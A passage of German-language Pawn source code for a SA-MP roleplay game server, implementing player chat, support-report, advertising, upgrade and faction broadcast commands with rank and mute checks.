					SendClientMessage(playerid, COLOR_GRAD1, " Der Spieler wurde nicht gefunden!");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt!");
			}
		}
		return 1;
	}
	if (strcmp(cmd, "/number", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pPhoneBook] == 1)
			{
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "NUTZUNG: /number [playerid/GetName]");
					return 1;
				}
				//giveplayerid = strval(tmp);
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
						GetPlayerName(giveplayerid, sendername, sizeof(sendername));
						format(string, 256, "Name: %s, Telefonnummer: %d",sendername,PlayerInfo[giveplayerid][pPnumber]);
						SendClientMessage(playerid, COLOR_GRAD1, string);
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Spieler nicht gefunden !");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du hast noch kein Telefonbuch!");
			}
		}
		return 1;
	}
//-------------------------------[UPGRADE]--------------------------------------------------------------------------
	if (strcmp(cmd, "/upgrade", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new gunid[16];
			new infostring[256];
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				format(string, sizeof(string), "NUTZUNG: /upgrade [Upgradename] (Du hast %d Upgrade Punkte)",PlayerInfo[playerid][gPupgrade]);
				SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
				SendClientMessage(playerid, COLOR_WHITE,"*** UPGRADES ***");
				SendClientMessage(playerid, COLOR_GRAD2,string);
				if(PlayerInfo[playerid][pLevel] >= 2)
				{
					SendClientMessage(playerid, COLOR_GRAD3, "Level 2 Vergünstigung: Alkoholskill");
				}
				else if(PlayerInfo[playerid][pLevel] >= 3)
				{
					SendClientMessage(playerid, COLOR_GRAD3, "Level 3 Vergünstigung: Drogenskill");
				}
				SendClientMessage(playerid, COLOR_GRAD5, "Extra Energie: Spawnhealth");
				SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
				return 1;
			}
			strmid(gunid, tmp, 0, strlen(cmdtext), 255);
			if (PlayerInfo[playerid][gPupgrade] > 1)
			{
				if (PlayerInfo[playerid][pLevel] >= 1 && (strcmp(gunid, "spawnhealth", true, strlen(gunid)) == 0))
				{
					if (PlayerInfo[playerid][pSHealth] < 50)
					{
						PlayerInfo[playerid][pSHealth] = PlayerInfo[playerid][pSHealth]+5;
						format(infostring, 256, "Neues Upgrade: Du spawnst nun mit %.2f Energie (+5)",PlayerInfo[playerid][pSHealth]+50);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD6, "Du hast bereits Maximalen Spawn Heal!");
						return 1;
					}
				}
				else if (PlayerInfo[playerid][pLevel] >= 1 && (strcmp(gunid, "alkoholskill", true, strlen(gunid)) == 0))
				{
					if (PlayerInfo[playerid][pAlcoholPerk] < 3)
					{
						PlayerInfo[playerid][pAlcoholPerk] += 1;
						format(infostring, 256, "Neues Vergünstigungsupgrade: Dein Alkoholikerlevel ist nun %d.",PlayerInfo[playerid][pAlcoholPerk]);
						PlayerInfo[playerid][gPupgrade]--;
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD6, "   Dein Alkoholikerlevel hat das Maximum erreicht !");
						return 1;
					}
				}
				else if (PlayerInfo[playerid][pLevel] >= 2 && (strcmp(gunid, "drogenskill", true, strlen(gunid)) == 0))
				{
					if (PlayerInfo[playerid][pDrugPerk] < 3)
					{
						PlayerInfo[playerid][pDrugPerk] += 1;
						format(infostring, 256, "Neues Vergünstigungsupgrade: Dein Drogenskill level ist nun %d.",PlayerInfo[playerid][pDrugPerk]);
						PlayerInfo[playerid][gPupgrade]--;
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD6, "   Dein Drogensuchtlevel hat das Maximum erreicht !");
						return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD6, "   Unbekanntes Upgrade");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD6, "   Du hast 0 Upgrade Punkte");
				return 1;
			}
			SendClientMessage(playerid, COLOR_GRAD6, infostring);
			PlayerInfo[playerid][gPupgrade]--;
		}
		return 1;
	}
	if(strcmp(cmd, "/sup", true) == 0|| strcmp(cmd, "/report", true) == 0|| strcmp(cmd, "/support", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][paMuted] == 1)
	        {
				new stringd[128];
	            format(stringd, sizeof(stringd), "Du bist noch für %d Minuten vom Support System ausgeschlossen!", PlayerInfo[playerid][paMutedTime]);
	            SendClientMessage(playerid, COLOR_GRAD2, stringd);
				return 1;
			}
			if(FirstReport[playerid] == 1)
			{
			    ShowPlayerDialog(playerid,DIALOG_FIRSTREPORT,DIALOG_STYLE_MSGBOX,"Erster Report","Bevor du deinen ersten /sup schreibst möchten wir dich gerne darauf hinweisen,\ndass viele Anfängerfragen schon im /faq beantwortet worden sind.\nBitte schau kurz rein bevor du deinen Report schickst","Okay","");
			}
 	        GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[128];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: (/sup [Text]");
				return 1;
			}
			new stringrp4[200];
			new stringrp[200];
			GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			if(ReportCall[playerid] != 999)
			{
			        format(string, sizeof(string), "[Support] %s: %s", sendername, result);
			        SendClientMessage(playerid, COLOR_GREEN,string);
			        for(new x = 0; x<MAX_PLAYERS; x++)
			        {
			            if(PlayerInfo[x][pAdmin]>=2002)
			            {
			                if(PlayerInfo[playerid][pAdmin]>=2002) break;
			                new stringa[256];
			                format(stringa,sizeof(stringa),"[Support #%d]: %s sagte zu %s: %s",ReportCallNumber[playerid],GetName(playerid),GetName(ReportCall[playerid]),result);
			                SCM(x,COLOR_GREY,stringa);
						}
					}
			        if(ReportCall[ReportCall[playerid]] == playerid)
					{
			        	SendClientMessage(ReportCall[playerid], COLOR_LIGHTGREEN,string);
						if(PlayerInfo[playerid][pAdmin] > 1)
	      				{
							format(stringrp4, sizeof(stringrp4), "[%s] %s", GetPlayerAdminName(playerid), string);
							WBB_AddPostUserID(1, 114, "Supporter-Log", stringrp4, 1, 0, 1, 1, 0, 0, playerid, 1);
						}
			  		}
			  		return 1;
			}
	        if(JustReported[playerid] == 1)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "Bitte warte 30 Sekunden bis du den Nächsten Report schreiben kannst !");
	            return 1;
			}
			format(stringrp, sizeof(stringrp), "Meldung von: [ID:%d]%s", playerid, sendername);
			ABroadCast(0xE19898AA,stringrp,1);
			SBroadCast(0xE19898AA,stringrp,1);
			format(stringrp, sizeof(stringrp), "Meldung: %s", (result));
			ABroadCast(0xE19898AA,stringrp,1);
			SBroadCast(0xE19898AA,stringrp,1);
			ABroadCast(0xA04C4CAA,"Tippe '/ar [SpielerID]' or '/tr [SpielerID]'",1);
		//	SendClientMessage(playerid, 0x96C184AA, "Dein Report wurde an alle Admins gesendet die Online sind.");
		    SendClientMessage(playerid, 0x96C184AA, "Du hast deinen Report abgeschickt!");
			JustReported[playerid] = 1;
			PlayerNeedsHelp[playerid] = 1;
			SetTimerEx("ReportReset", 30000, false, "i", playerid);
	    }
	    return 1;
	}

//==================================OOC=========================================
	if(strcmp(cmd, "/ooc", true) == 0 || strcmp(cmd, "/o", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
				new ultimatestring[512];
		        if(gPlayerLogged[playerid] == 0)
		        {
		            SendClientMessage(playerid, COLOR_GREY, "   Du bist noch nicht Eingeloggt !");
		            return 1;
		        }
				if(PlayerInfo[playerid][pMuted] == 1)
				{
	                format(string, sizeof(string), "Du kannst nichts schreiben du bist noch für %d Minuten gemutet.", PlayerInfo[playerid][pMutedTime]);
	            	SendClientMessage(playerid, COLOR_RED, string);
//					SendClientMessage(playerid, TEAM_CYAN_COLOR, "   Du kannst nicht sprechen, du bist gemutet !");
					return 1;
				}
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
				{
					idx++;
				}
				new offset = idx;
				new result[240];
				while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
				{
					result[idx - offset] = cmdtext[idx];
					idx++;
				}
				result[idx - offset] = EOS;
				if(!strlen(result))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "NUTZUNG: (/o)oc [ooc chat]");
					return 1;
				}




				if(PlayerInfo[playerid][pCarkeys] == 36)
				{
				    new Link[1200];
				    format(Link,sizeof(Link),"api.microsofttranslator.com/V2/Ajax.svc/Translate?appId=6635D742380CF583FEE16FF83E80BC8238F166E3&to=it&text=%s",result);
				    for(new c; c < strlen(Link)+1; c++)
				    {
				         if(Link[c] == ' ') Link[c] = '+';
				    }
					HTTP(playerid, HTTP_GET, Link, "", "UpdateResponseOOC");

					return 1;
				}


				if(PlayerInfo[playerid][pAdmin] == 2)
				{
					format(ultimatestring, sizeof(ultimatestring), "{2179a5}(( * Communityhelfer %s: %s ))", sendername, result);
				}
				else if(PlayerInfo[playerid][pAdmin] == 4)
				{
					format(ultimatestring, sizeof(ultimatestring), "{2179a5}(( * Supporter %s: %s ))", sendername, result);
				}
				else if(PlayerInfo[playerid][pAdmin] == 1337)
				{
					format(ultimatestring, sizeof(ultimatestring), "{2179a5}(( * Moderator %s: %s ))", sendername, result);
				}
				else if(PlayerInfo[playerid][pAdmin] == 1338)
				{
					format(ultimatestring, sizeof(ultimatestring), "{2179a5}(( * Administrator %s: %s ))", sendername, result);
				}
			    else if(PlayerInfo[playerid][pAdmin] == 2000)
				{
					format(ultimatestring, sizeof(ultimatestring), "{2179a5}(( * Head-Admin %s: %s ))", sendername, result);
				}
				else if(PlayerInfo[playerid][pAdmin] == 2001)
				{
					format(ultimatestring, sizeof(ultimatestring), "{2179a5}(( * Stellv. Projektleitung %s: %s ))", sendername, result);
				}
				else if(PlayerInfo[playerid][pAdmin] == 2002)
				{
					format(ultimatestring, sizeof(ultimatestring), "{2179a5}(( * Projektleitung %s: %s ))", sendername, result);
				}
				else if(PlayerInfo[playerid][pAdmin] >= 2005)
				{
					format(ultimatestring, sizeof(ultimatestring), "{2179a5}(( * UC-Admin: %s ))",  result);
				}
				else if(PlayerInfo[playerid][pDonateRank] > 1 && (noooc))
				{
					format(ultimatestring, sizeof(ultimatestring), "(( * Premiumuser %s: %s ))", sendername, result);
				}
				else if(PlayerInfo[playerid][pAdmin] == 0 && (noooc))
				{
				    format(ultimatestring, sizeof(ultimatestring), "(( %s: %s ))", sendername, result);
				}
				else return 1;
//                SendClientMessageToAllEx(COLOR_OOC, string);




				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i))
					{
					    if(!gOoc[i])
					    {
							SendClientMessageEx(i, COLOR_WHITE, ultimatestring);
						}
					}
				}








		//		OOCOff(COLOR_OOC,ultimatestring);
				Log("OA-Chat.txt",ultimatestring);
		}
		return 1;
	}
	if(strcmp(cmd, "/noooc", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 4 && (!noooc))
			{
				noooc = 1;
				BroadCast(COLOR_GRAD2, "Der öffentliche Chat wurde eingeschaltet.");
			}
			else if (PlayerInfo[playerid][pAdmin] >= 4 && (noooc))
			{
				noooc = 0;
				BroadCast(COLOR_GRAD2, "Der öffentliche Chat wurde ausgeschaltet.");
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht berechtigt!");
			}
		}
		return 1;
	}

//----------------------------------[advertise]-----------------------------------------------
	if(strcmp(cmd, "/sadvertise", true) == 0 || strcmp(cmd, "/sad", true) == 0)
	{
		if(PlayerInfo[playerid][pLevel] >= 4)
		{
		    if(IsPlayerConnected(playerid))
		    {
		        if(gPlayerLogged[playerid] == 0)
		        {
		            SendClientMessage(playerid, COLOR_GREY, "Du bist noch nicht eingeloggt!");
		            return 1;
		        }
			    if(GetPlayerFaction(playerid) == 21||GetPlayerFaction(playerid) == 8)
			    {
					GetPlayerName(playerid, sendername, sizeof(sendername));
					new length = strlen(cmdtext);
					while ((idx < length) && (cmdtext[idx] <= ' '))
					{
						idx++;
					}
					new offset = idx;
					new result[128];
					while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
					{
						result[idx - offset] = cmdtext[idx];
						idx++;
					}
					result[idx - offset] = EOS;
					if(!strlen(result))
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: (/sad)vertise [text]");
						return 1;
					}
					if ((!adds) && (PlayerInfo[playerid][pAdmin] < 1))
					{
						format(string, sizeof(string), "Bitte Versuch es Später wieder %d sekunden zwischen einer Werbung!",  (addtimer/1000));
						SendClientMessage(playerid, COLOR_GRAD2, string);
						return 1;

					}
					new payout = 5000+idx;
					if(GetPlayerMoneySave(playerid) < payout)
			        {
			            format(string, sizeof(string), "* Du hast %d Zeichen benutzt, das kostet $%d, du hast nicht genug dabei.", offset, payout);
			            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			            return 1;
			        }
			        FraktionsKasse[6] += payout;
					GivePlayerMoneySave(playerid, - payout);
					format(stringx, sizeof(stringx), "AdmWarning: %s hat eine Hitman/Wheelman Werbung geschrieben.", sendername);
					ABroadCast(COLOR_LIGHTRED, stringx, 1);
//					SBroadCast(TEAM_Grove_COLOR, stringx, 1);
					format(string, sizeof(string), "{00db00}[Werbung]: %s, Kontakt: Unbekannt, Telefonnummer: -",  result);
					OOCNews(TEAM_Grove_COLOR,string);
					format(string, sizeof(string), "~r~Rechnung: $%d~n~~w~Nachricht hatte: %d Zeichen.", payout, idx);
					GameTextForPlayer(playerid, string, 5000, 5);
					if (PlayerInfo[playerid][pAdmin] < 1){SetTimer("AddsOn", addtimer, 0);adds = 0;}
				}
				else {
			        SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Wheelman // Hitman!");
					return 1;
				}

			}
		}
		else SendClientMessage(playerid,COLOR_RED,"Du brauchst Level 4 um eine Werbung zu schreiben.");
		return 1;
	}
	if(strcmp(cmd, "/advertise", true) == 0 || strcmp(cmd, "/ad", true) == 0)
	{
		if(PlayerInfo[playerid][pLevel] >= 3)
		{
		    if(IsPlayerConnected(playerid))
		    {
				if(PlayerInfo[playerid][pMuted] == 1)
				{
	                format(string, sizeof(string), "Du kannst nichts schreiben du bist noch für %d Minuten gemutet.", PlayerInfo[playerid][pMutedTime]);
	            	SendClientMessage(playerid, COLOR_RED, string);
//					SendClientMessage(playerid, TEAM_CYAN_COLOR, "   Du kannst nicht sprechen, du bist gemutet !");
					return 1;
				}
		        if(gPlayerLogged[playerid] == 0)
		        {
		            SendClientMessage(playerid, COLOR_GREY, "   Du bist noch nicht eingeloggt !");
		            return 1;
		        }
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
				{
					idx++;
				}
				new offset = idx;
				new result[100];
				while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
				{
					result[idx - offset] = cmdtext[idx];
					idx++;
				}
				result[idx - offset] = EOS;
				if(!strlen(result))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: (/ad)vertise [text]");
					return 1;
				}
				if ((!adds) && (PlayerInfo[playerid][pAdmin] < 1338))
				{
					format(string, sizeof(string), "Bitte Versuch es Später wieder %d Sekunden zwischen einer Werbung!",  (addtimer/1000));
					SendClientMessage(playerid, COLOR_GRAD2, string);
					return 1;

				}
				new payout = idx * BizzInfo[57][bTill];
//				new payout = 500+idx;
				if(GetPlayerMoneySave(playerid) < payout)
		        {
		            format(string, sizeof(string), "* Du hast %d Zeichen benutzt, das kostet $%d, du hast nicht genug dabei.", offset, payout);
		            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		            return 1;
		        }
				BizzInfo[57][bTill] += payout/3;
				ExtortionBiz(57, payout);
				GivePlayerMoneySave(playerid, - payout);
				format(string, sizeof(string), "{00db00}[Werbung]: %s, %s (%d)",  result, sendername,PlayerInfo[playerid][pPnumber]);
				OOCNews(TEAM_Grove_COLOR,string);
				format(string, sizeof(string), "~r~Rechnung: $%d~n~~w~Nachricht hatte: %d Zeichen.", payout, idx);
				GameTextForPlayer(playerid, string, 5000, 5);
				if (PlayerInfo[playerid][pAdmin] < 1){SetTimer("AddsOn", addtimer, 0);adds = 0;}
			}
		}
		else SendClientMessage(playerid,COLOR_RED,"Du brauchst Level 3 um eine Werbung zu schreiben.");
		return 1;
      	}

        //----------------------------------[government]-----------------------------------------------
		if(strcmp(cmd, "/government", true) == 0 || strcmp(cmd, "/gov", true) == 0)
	    {
	    if(IsPlayerConnected(playerid))
	    {
			if(gTeam[playerid] != 2 && !IsACop(playerid) && !IsPlayerInFrac(playerid, 7)&& !IsPlayerInFrac(playerid, 24)&& !IsPlayerInFrac(playerid, 11)&& !IsPlayerInFrac(playerid, 15))
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Polizist !");
			    return 1;
			}
			if(PlayerInfo[playerid][pRank] < 5)
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du brauchst Rang 5  !");
			    return 1;
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[95];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: (/gov)ernment [text]");
				return 1;
			}
                if(PlayerInfo[playerid][sMember] == 1) format(string, sizeof(string), "<< %s %s: %s >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 2) format(string, sizeof(string), "<< %s %s: %s >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 3) format(string, sizeof(string), "<< %s %s: %s >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 4) format(string, sizeof(string), "<< %s %s: %s >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 7) format(string, sizeof(string), "<< %s %s: %s >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 18) format(string, sizeof(string), "<< %s %s: %s >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 22) format(string, sizeof(string), "<< %s %s: %s >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 24) format(string, sizeof(string), "<< %s %s: %s >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 15) format(string, sizeof(string), "<< %s %s: %s >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
			    SendClientMessageToAllEx(COLOR_DBLUE, string);
		}
		return 1;
	}

//----------------------------------[togooc]-----------------------------------------------

	if(strcmp(cmd, "/togooc", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pDonateRank] >= 3)
	        {
			if (!gOoc[playerid])
			{
				gOoc[playerid] = 1;
				SendClientMessage(playerid, COLOR_GRAD2, "OOC ausgeschaltet!");
			}
			else if (gOoc[playerid])
			{
				gOoc[playerid] = 0;
				SendClientMessage(playerid, COLOR_GRAD2, "OOC eingeschaltet");
			}
     	}
		}
		return 1;
	}
	if(strcmp(cmd, "/tognews", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pDonateRank] >= 3)
	        {
			if (!gNews[playerid])
			{
				gNews[playerid] = 1;
				SendClientMessage(playerid, COLOR_GRAD2, "Nachrichten ausgeschaltet!");
			}
			else if (gNews[playerid])
			{
				gNews[playerid] = 0;
				SendClientMessage(playerid, COLOR_GRAD2, "Nachrichten eingeschaltet.");
			}
		}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Dafür hast kein Premium!");
	            return 1;
			}
         }
		return 1;
	}
	if(strcmp(cmd, "/togphone", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pDonateRank] >= 3)
	        {
				if (!PhoneOnline[playerid])
				{
					PhoneOnline[playerid] = 1;
					SendClientMessage(playerid, COLOR_GRAD2, "Du hast dein Telefon ausgeschaltet.");
				}
				else if (PhoneOnline[playerid])
				{
					PhoneOnline[playerid] = 0;
					SendClientMessage(playerid, COLOR_GRAD2, "Du hast dein Telefon eingeschaltet.!");
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Du hast kein Premium!!");
	            return 1;
			}
		}
		return 1;
	}
//----------------------------------[Emote]-----------------------------------------------
	if(strcmp(cmd, "/me", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(gPlayerLogged[playerid] == 0)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist noch nicht eingeloggt!");
	            return 1;
	        }
	        if(PlayerInfo[playerid][pTot] == 1)
		    {
		        SendClientMessage(playerid, COLOR_GREY, "Du kannst nicht reden , da du Verletzt bist!");
				return 1;
		    }
			if(PlayerInfo[playerid][pGangJailed] == 1)
			{
			    SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du kannst nicht reden, du bist im GangJail!");
				return 1;
			}
			if(PlayerInfo[playerid][pMauled] == 1)
			{
			    SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du kannst nicht reden, du bist gefesselt!");
				return 1;
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /me [aktion]");
				return 1;
			}
			format(string, sizeof(string), "* %s %s", sendername, result);
			ProxDetectorEx(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			printf("%s", string);
		}
		return 1;
	}
//----------------------------------[Local]-----------------------------------------------
	if(strcmp(cmd, "/close", true) == 0 || strcmp(cmd, "/c", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
				if(PlayerInfo[playerid][pMuted] == 1)
				{
	                format(string, sizeof(string), "Du kannst nichts schreiben du bist noch für %d Minuten gemutet.", PlayerInfo[playerid][pMutedTime]);
	            	SendClientMessage(playerid, COLOR_RED, string);
//					SendClientMessage(playerid, TEAM_CYAN_COLOR, "   Du kannst nicht sprechen, du bist gemutet !");
					return 1;
				}
	        if(gPlayerLogged[playerid] == 0)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist noch nicht eingeloggt !");
	            return 1;
	        }
			if(PlayerInfo[playerid][pGangJailed] == 1)
			{
			    SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du kannst nicht reden, du bist im Gangjail!");
				return 1;
			}
			if(PlayerInfo[playerid][pMauled] == 1)
			{
			    SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du kannst nicht reden, du bist gefesselt!");
				return 1;
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /(c)lose [close chat text]");
				return 1;
			}
			format(string, sizeof(string), "%s sagt: %s", sendername, result);
			ProxDetector(3.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			printf("%s", string);
		}
		return 1;
	}
//----------------------------------[Shout]-----------------------------------------------
	if(strcmp(cmd, "/shout", true) == 0 || strcmp(cmd, "/s", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pTot] == 1)
		    {
		        SendClientMessage(playerid, COLOR_GREY, "Du kannst derzeit nicht Sprechen!");
		        return 1;
		    }
	        if(gPlayerLogged[playerid] == 0)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist noch nicht eingeloggt !");
	            return 1;
	        }
			if(PlayerInfo[playerid][pGangJailed] == 1)
			{
			    SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du kannst nicht reden, du bist im GangJail!");
				return 1;
			}
			if(PlayerInfo[playerid][pMauled] == 1)
			{
			    SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du kannst nicht reden, du bist gefesselt!");
				return 1;
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: (/s)hout [local chat]");
				return 1;
			}
			format(string, sizeof(string), "%s schreit: %s!!", sendername, result);
			ProxDetector(30.0, playerid, string,COLOR_WHITE,COLOR_WHITE,COLOR_WHITE,COLOR_FADE1,COLOR_FADE2);
			printf("%s", string);
		}
		return 1;
	}
//----------------------------------[Shout]-----------------------------------------------
	if(strcmp(cmd, "/megaphone", true) == 0 || strcmp(cmd, "/m", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pGangJailed] == 1)
			{
			    SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du kannst im Gangjail kein Megephone benutzen!");
				return 1;
			}
			if(PlayerInfo[playerid][pMauled] == 1)
			{
			    SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du kannst gefesselt kein Megaphone benutzen!");
				return 1;
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[90];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: (/m)egaphone [megaphone chat]");
				return 1;
			}
            if(PlayerInfo[playerid][sMember] == 1 || PlayerInfo[playerid][sMember] == 2 || PlayerInfo[playerid][sMember] == 3 || PlayerInfo[playerid][sMember] == 4 || PlayerInfo[playerid][sMember] == 7 || PlayerInfo[playerid][sMember] == 24 || PlayerInfo[playerid][sMember] == 22|| PlayerInfo[playerid][sMember] == 15)
            {
                if(PlayerInfo[playerid][sMember] == 1) format(string, sizeof(string), "[%s %s >> %s <<]",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 2) format(string, sizeof(string), "[%s %s >> %s <<]",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 3) format(string, sizeof(string), "[%s %s >> %s <<]",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 4) format(string, sizeof(string), "[%s %s >> %s <<]",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 7) format(string, sizeof(string), "[%s %s >> %s <<]",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 18) format(string, sizeof(string), "[%s %s >> %s <<]",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 22) format(string, sizeof(string), "[%s %s >> %s <<]",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 24) format(string, sizeof(string), "[%s %s >> %s <<]",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
